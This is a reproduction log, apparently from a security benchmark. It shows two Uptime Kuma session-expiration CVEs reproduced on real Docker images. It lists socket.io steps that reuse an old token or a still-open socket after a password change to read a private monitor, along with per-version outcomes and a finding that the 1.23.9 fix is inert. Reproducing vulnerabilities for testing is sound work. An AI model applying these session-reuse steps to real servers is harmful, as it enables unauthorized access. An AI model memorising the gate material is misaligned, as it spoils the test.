# repro.log — uptime-kuma-cve-2023-49804 (Insufficient Session Expiration after password change, CWE-613)
# Pair: CVE-2023-44400 (original, fixed v1.23.3) -> CVE-2023-49804 (incomplete-fix residual)
# REAL-APP rebuild: boots REAL published Uptime Kuma images and drives them over a REAL socket.io
# connection (python-socketio). NO lifted harness. NO Uptime Kuma code copied into the repo.
# Gate: Variant A (validate_case). Real Docker. Ports v0=40740 v1=40741 v2=40742 (host -> 3001).

=== images (real, official) ===
v0 = louislam/uptime-kuma:1.23.2   (pre-CVE-2023-44400)
v1 = louislam/uptime-kuma:1.23.3   (CVE-2023-44400-patched; CVE-2023-49804 TARGET)
v2 = louislam/uptime-kuma:1.23.10  (CVE-2023-49804 actually fixed; see 1.23.9 finding below)

=== real socket.io flow (per version, driven by oracle.py via python-socketio) ===
setup(admin, OldPass123)                 # complete the real setup wizard (first boot)
login(admin, OldPass123) -> token        # real 'login' event
add({name/description = ${PCB_FLAG}, active:false})   # seed a PRIVATE monitor (real 'add' event)
# SEED leg (CVE-2023-44400 — new-connection old-token replay):
#   A: login -> capture token ; B: login + changePassword(OldPass123 -> NewPass123)
#   C (NEW conn): loginByToken(old token) -> getMonitorList -> read seeded monitor
# RESIDUAL leg (CVE-2023-49804 — pre-change persistent live socket):
#   D: login (kept OPEN) ; E: login + changePassword(NewPass123 -> Rot8Pass456)
#   D (SAME still-open socket): getMonitorList -> read seeded monitor
# Flag is surfaced ONLY through the real authenticated getMonitorList -> 'monitorList' push
# (gated by checkLogin(socket)). Success body = 'SECRET=<FLAG>'.

=== GATE (python3 oracle.py --run-gate) ===
{
  "original_poc_reaches_flag_on_v0": true,
  "original_poc_blocked_on_v1": true,
  "bypass_poc_reaches_flag_on_v1": true,
  "passed": true,
  "_residual_blocked_on_v2": true,
  "_seed_blocked_on_v2": true,
  "_env_ready": { "v0": true, "v1": true, "v2": true }
}

=== raw real-socket.io evidence (${PCB_FLAG} elided as <FLAG>) ===
SEED (CVE-2023-44400: NEW connection replays the OLD token after a real password change):
  v0 (1.23.2):  setup ok, add ok(monitorID=1); token_captured=true loginByToken_ok=true  flag=true  body="SECRET=<FLAG>"  -> REACHES (no password binding)
  v1 (1.23.3):  setup ok, add ok(monitorID=1); token_captured=true loginByToken_ok=false flag=false body="loginByToken rejected (token invalid due to password change)" -> BLOCKED (h=shake256(pw) mismatch)
  v2 (1.23.10): token_captured=true loginByToken_ok=false flag=false -> BLOCKED
RESIDUAL (CVE-2023-49804: connection authenticated BEFORE the change, reused after it):
  v0 (1.23.2):  d_still_connected=true  changePassword_ok=true flag=true  body="SECRET=<FLAG>" -> REACHES
  v1 (1.23.3):  d_still_connected=true  changePassword_ok=true flag=true  body="SECRET=<FLAG>" -> REACHES (no disconnect mechanism exists in 1.23.3)
  v2 (1.23.10): d_still_connected=false changePassword_ok=true flag=false body="live socket torn down after password change (disconnectAllSocketClients)" -> BLOCKED

=== !!! FINDING: the NVD-listed fix version 1.23.9 is INERT !!! ===
The real louislam/uptime-kuma:1.23.9 image's changePassword handler calls:
    server.disconnectAllSocketClient(user.id, socket.id);      // SINGULAR
but UptimeKumaServer only defines:
    disconnectAllSocketClients(userID, currentSocketID)         // PLURAL
So the call throws "server.disconnectAllSocketClient is not a function", is CAUGHT by the handler
(changePassword returns ok:false yet user.resetPassword already ran, so the password DOES change),
and NO socket is ever disconnected. The frontend dist never emits 'disconnectOtherSocketClients'
after a password change either (only a separate, unused socket event uses the plural method).
Net effect: 1.23.9 does NOT log existing sockets out -> the CVE-2023-49804 residual persists
through 1.23.9 identically to 1.23.3.
Empirical check on real 1.23.9 (over real socket.io):
    E changePassword P0->P1 -> {"ok":false,"msg":"server.disconnectAllSocketClient is not a function"}
    D connected after PURE changePassword: true           # pre-change socket STILL alive
    (login with P0 now fails, login with P1 ok -> password really did change)
The typo is corrected to the PLURAL form in 1.23.10 (verified on the real 1.23.10 image AND against
upstream raw server/server.js at tags 1.23.9 (singular) vs 1.23.10 (plural)). On real 1.23.10:
    E PURE changePassword P0->P1 -> {"ok":true,"msg":"Password has been updated successfully."}
    D disconnect: io server disconnect                    # pre-change socket torn down
Therefore V2 is pinned to 1.23.10 (the version that actually closes the residual through the real
password-change workflow), not 1.23.9.

=== interpretation ===
Same sink = the socket.io login/loginByToken -> afterLogin(socket.userID) -> checkLogin auth path,
reaching the real authenticated getMonitorList/monitorList flag sink. CVE-2023-44400 (v1.23.3) bound
the JWT to shake256(password) and rejects a stale token on loginByToken, so a NEW-connection
old-token replay (the SEED) is blocked on V1. But an ALREADY-authenticated connection is never
re-validated and no disconnect exists, so the pre-change persistent socket (the RESIDUAL) still
reaches the flag on V1 -- exactly CVE-2023-49804. V1.23.10 added a WORKING
server.disconnectAllSocketClients(user.id, socket.id) in changePassword, closing the residual on V2.

=== data-quality ===
Distinct fixes, distinct releases, not co-disclosed: CVE-2023-44400 fixed in v1.23.3 (Oct 2023);
CVE-2023-49804 residual truly closed in v1.23.10 (Dec 2023), with intervening non-CVE releases and
the inert 1.23.9. Different files/commits (user.js createJWT + server.js loginByToken vs server.js
changePassword + uptime-kuma-server.js disconnectAllSocketClients). Both gate preconditions
satisfiable on the real app: SEED blocked on V1, RESIDUAL reaches on V1.

=== teardown ===
docker compose --profile v0 --profile v1 --profile v2 down -v --rmi all ; docker image prune -f
